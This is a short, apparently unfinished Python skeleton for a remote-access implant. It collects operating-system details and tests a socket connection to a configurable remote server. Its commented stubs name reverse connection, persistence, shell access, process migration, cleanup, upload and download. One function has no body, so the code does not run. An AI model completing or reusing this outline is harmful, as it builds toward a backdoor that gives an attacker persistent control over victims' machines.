import platform
import socket


portstotest = []
persistent = []


class OperatingSysetm(object):
    os = ""
    osversion = ""
    osrelease = ""
    artictecture = ""


class ServerConnection(object):
    remoteserver = ""
    remoteserverport = 0


def getosinfo():
    try:
        OperatingSysetm.os = platform.system()
        OperatingSysetm.osrelease = platform.release()
        OperatingSysetm.osversion = platform.version()
        OperatingSysetm.artictecture = platform.machine()
    except Exception as e:
        print(e)
    return OperatingSysetm


def testconectivity():
    s = socket.socket()
    try:
        s.connect((ServerConnection.remoteserver, ServerConnection.remoteserverport))
        return True
    except Exception as e:
        print(e)
    finally:
        s.close()


def reverseconnection():
#
#

if __name__ == '__main__':
    myos = getosinfo()
    test = testconectivity()


# def reverseconnection():
# def setpersistent():
# def getshell():
# def enumos():
# def migrateprocess():
# def cleanup():
# def upload():
# def download():



